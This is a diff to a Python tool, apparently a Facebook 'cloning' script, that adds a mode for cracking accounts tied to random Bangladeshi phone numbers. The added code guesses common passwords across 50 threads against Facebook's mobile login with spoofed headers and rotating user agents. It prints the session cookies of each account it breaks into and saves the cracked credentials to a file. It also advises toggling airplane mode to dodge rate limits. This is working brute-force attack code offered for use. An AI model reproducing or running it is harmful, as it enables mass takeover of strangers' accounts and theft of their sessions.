@@ -222,17 +222,20 @@ def Main():
 	os.system('clear')
 	print(logo)
 	print(60*'\033[1;32m═')
-	print('\033[1;32m[1] Start Cloning ')
-	print("\033[1;32m[2] Contact Owner Fb")
-	print("\033[1;32m[2] Contact Owner wp")
+	print('\033[1;32m[1] Start Uid Cloning ')
+	print('\033[1;32m[2] Start Number Cloning ')
+	print("\033[1;32m[3] Contact Owner Fb")
+	print("\033[1;32m[4] Contact Owner wp")
 	print('\033[1;32m[0] Back')
 	print(60*'═')
 	opt = input('Choose option :> ')
 	if opt =='1':
 		virus()
 	if opt =='2':
-		os.system('xdg-open https://www.facebook.com/N4Y4N.8R4ND.Y0UR.N3X7.D4D');time.sleep(1)
+		nayan()
 	if opt =='3':
+		os.system('xdg-open https://www.facebook.com/N4Y4N.8R4ND.Y0UR.N3X7.D4D');time.sleep(1)
+	if opt =='4':
 		os.system('xdg-open https://wa.me/+8801615298449');time.sleep(1)
 	elif opt =='0':
 		exit()
@@ -324,6 +327,100 @@ def a(uid,pwx,tl):
                 print(f'\r\33[1;92m [NAYAN🖤] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92mCOOKIE  [💉]  : '+coki)
                 open('/sdcard/NAYAN-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\033[m[NAYAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks)))
+        sys.stdout.flush()
+    except:
+        pass
+        
+def nayan():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print(" \033[1;32mSim Code 👉 : 016, 017, 018, 019, 014, 013")
+	kode = input(' \033[92m[\033[37m*\033[92m] \033[37m \033[1;32mEnter sim code: ')
+	doamin = ' BD Uid Clone '
+	limit = int(input(' \033[92m[\033[37m?\033[92m] \033[37m {G}Number Add Limit : '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=50) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print(f"\033[92m[\033[37m*\033[92m] \033[37m \033[1;32m NAYAN Premium Mood Activated ")
+		print(f"\033[92m[\033[37m*\033[92m] \033[37m  Tool Name:\033[1;92m {doamin}")
+		print('\033[92m[\033[37m*\033[92m] \033[37m  Total ids:\033[1;92m '+tl)
+		print(f'\033[92m[\033[37m*\033[92m] \033[37m  BD Code :\033[1;92m {kode} ')
+		print('\033[92m[\033[37m*\033[92m] \033[37m  The process has been started')
+		print('\033[92m[\033[37m*\033[92m] \033[37m \033[1;92m NOTE : Fast Airplane Mode [ On/Off ] Be For Use ')
+		print(60*'=')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			yaari.submit(b,uid,pwx,tl)
+	print(60*'═')
+	print(' \033[92m[\033[37m*\033[92m] \033[37m Crack process has been completed')
+	print(' \033[92m[\033[37m*\033[92m] \033[37m Id Save In /sdcard/paid-ok.txt')
+	print(60*'═')
+	exit()
+def b(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mNAYAN\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            #oo=random.choice(sss)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f'\r\33[1;92m [NAYAN💥] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;92mCOOKIE  [💉]  : '+coki)
+                open('/sdcard/NAYAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             else:
